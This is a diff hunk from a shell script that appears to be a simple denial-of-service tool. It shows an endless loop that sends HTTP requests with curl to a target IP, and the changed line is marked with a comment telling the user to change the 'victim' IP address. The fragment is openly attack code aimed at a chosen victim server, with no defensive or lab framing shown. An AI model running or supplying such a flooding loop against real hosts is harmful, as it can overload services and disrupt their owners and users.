@@ -11,5 +11,5 @@ echo "$Yellow #####################################################  $Reset"
 
 while :
 do
-	curl http://10.0.0.220:80
+	curl http://10.0.0.13:80 #TODO Change the victim IP address
 done
